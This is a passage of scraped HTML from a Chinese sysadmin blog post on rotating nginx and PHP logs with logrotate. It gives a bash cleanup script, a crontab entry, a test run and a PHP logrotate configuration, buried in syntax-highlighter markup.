src=\"http://blog.jobbole.com/wp-content/plugins/latex/cache/tex_2dc76049c48dc883029c9094bec37345.gif\" style=\"vertical-align: middle; border: none; padding-bottom:2px;\" class=\"tex\" alt=\"[[:digit:]]\"></span><script type=\"math/tex\">[[:digit:]]</script>$/\\1/p')-$(echo $time)\r\ndone\r\n#对转储的日志文件进行压缩存放，并删除原有转储的日志文件，只保存压缩后的日志文件。以节约存储空间\r\nfor i in $(ls ./ | grep \"^<span class=\"MathJax_Preview\"><img src=\"http://blog.jobbole.com/wp-content/plugins/latex/cache/tex_4fd4a56c435d5c26b3c3c366f51b074e.gif\" style=\"vertical-align: middle; border: none; padding-bottom:2px;\" class=\"tex\" alt=\".*\"></span><script type=\"math/tex\">.*</script>\\-<span class=\"MathJax_Preview\"><img src=\"http://blog.jobbole.com/wp-content/plugins/latex/cache/tex_9dff6f37fad40b9f06f4b7157720ca6e.gif\" style=\"vertical-align: middle; border: none; padding-bottom:2px;\" class=\"tex\" alt=\"[[:digit:]-]\\+\"></span><script type=\"math/tex\">[[:digit:]-]\\+</script>$\")\r\ndo\r\ntar jcvf ${i}.bz2 ./${i}\r\nrm -rf ./${i}\r\ndone\r\n#只保留最近7天的压缩转储日志文件\r\nfind /data/nginx_logs/days/* -name \"*.bz2\" -mtime 7 -type f -exec rm -rf {} \\;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b95580581069-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b95580581069-23\">23</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">IDC</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># vim /usr/local/sbin/logrotate-nginx.sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-2\"><span class=\"crayon-p\">#!/bin/bash</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-3\"><span class=\"crayon-p\">#创建转储日志压缩存放目录</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-4\"><span class=\"crayon-v\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx_logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">days</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-5\"><span class=\"crayon-p\">#手工对nginx日志进行切割转换</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-6\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">vf</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-7\"><span class=\"crayon-p\">#当前时间</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-8\"><span class=\"crayon-v\">time</span><span class=\"crayon-o\">=</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">date</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"yesterday\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-s\">\"%Y-%m-%d\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-9\"><span class=\"crayon-p\">#进入转储日志存放目录</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-10\"><span class=\"crayon-v\">cd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx_logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">days</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-11\"><span class=\"crayon-p\">#对目录中的转储日志文件的文件名进行统一转换</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-12\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"^<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span>\\.[[:digit:]]$\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-13\"><span class=\"crayon-st\">do</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-14\"><span class=\"crayon-e\">mv</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">}</span><span class=\"crayon-o\">|</span><span class=\"crayon-v\">sed</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'s/^<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span>\\.<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">digit</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span>$/\\1/p'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-v\">time</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-15\"><span class=\"crayon-v\">done</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-16\"><span class=\"crayon-p\">#对转储的日志文件进行压缩存放，并删除原有转储的日志文件，只保存压缩后的日志文件。以节约存储空间</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-17\"><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">grep</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"^<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span>\\-<span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">digit</span><span class=\"crayon-o\">:</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">-</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-o\">+</span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">)</span>$\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-18\"><span class=\"crayon-st\">do</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-19\"><span class=\"crayon-e\">tar</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">jcvf</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">bz2</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-20\"><span class=\"crayon-v\">rm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">rf</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">{</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-21\"><span class=\"crayon-v\">done</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b95580581069-22\"><span class=\"crayon-p\">#只保留最近7天的压缩转储日志文件</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b95580581069-23\"><span class=\"crayon-v\">find</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">data</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">nginx_logs</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">days</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">name</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"*.bz2\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">mtime</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">type</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">f</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">exec</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">rm</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">rf</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">\\</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0069 seconds] -->\r\n<p><strong>3）crontab定时执行</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b9a597128734\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@bastion-IDC ~# crontab -e\r\n#logrotate\r\n0 0 * * * /bin/bash -x /usr/local/sbin/logrotate-nginx.sh &gt; /dev/null 2&gt;&amp;1 </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b9a597128734-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b9a597128734-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b9a597128734-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b9a597128734-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">IDC</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># crontab -e</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b9a597128734-2\"><span class=\"crayon-p\">#logrotate</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b9a597128734-3\"><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">bash</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">x</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">local</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sbin</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">nginx</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dev</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">null</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>手动执行脚本，测试下看看：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b9d545060216\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@bastion-IDC ~# /bin/bash -x /usr/local/sbin/logrotate-nginx.sh\r\n[root@bastion-IDC ~# cd /data/nginx_logs/days \r\n[root@bastion-IDC days# ls\r\nhuantest.access_log-2017-01-18.bz2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b9d545060216-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b9d545060216-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b9d545060216-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b9d545060216-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b9d545060216-1\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">IDC</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># /bin/bash -x /usr/local/sbin/logrotate-nginx.sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b9d545060216-2\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">IDC</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">~</span><span class=\"crayon-p\"># cd /data/nginx_logs/days </span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b9d545060216-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">bastion</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">IDC </span><span class=\"crayon-v\">days</span><span class=\"crayon-p\"># ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b9d545060216-4\"><span class=\"crayon-v\">huantest</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">access_log</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">2017</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">01</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">18.bz2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>———————————-php脚本切割一例———————————-</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45ba1326173986\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n[root@huanqiu_web1 ~]# cat /etc/logrotate.d/php \r\n/Data/logs/php/*log {\r\n    daily\r\n    rotate 365\r\n    missingok\r\n    notifempty\r\n    compress\r\n    dateext\r\n    sharedscripts\r\n    postrotate\r\n        if [ -f /Data/app/php5.6.26/var/run/php-fpm.pid ]; then\r\n            kill -USR1 `cat /Data/app/php5.6.26/var/run/php-fpm.pid`\r\n        fi\r\n    endscript\r\n    postrotate\r\n        /bin/chmod 644 /Data/logs/php/*gz\r\n    endscript\r\n}\r\n\r\n[root@huanqiu_web1 ~]# ll /Data/app/php5.6.26/var/run/php-fpm.pid \r\n-rw-r--r-- 1 root root 4 Dec 28 17:03 /Data/app/php5.6.26/var/run/php-fpm.pid\r\n\r\n[root@huanqiu_web1 ~]# cd /Data/logs/php\r\n[root@huanqiu_web1 php]# ll\r\ntotal 25676\r\n-rw-r--r-- 1 root   root         0 Jun  1  2016 error.log\r\n-rw-r--r-- 1 nobody nobody     182 Aug 30  2015 error.log-20150830.gz\r\n-rw-r--r-- 1 nobody nobody     371 Sep  1  2015 error.log-20150901.gz\r\n-rw-r--r-- 1 nobody nobody     315 Sep  7  2015 error.log-20150907.gz\r\n.........\r\n.........</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45ba1326173986-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45ba1326173986-20\">20</div><div class=\"crayon-num\" 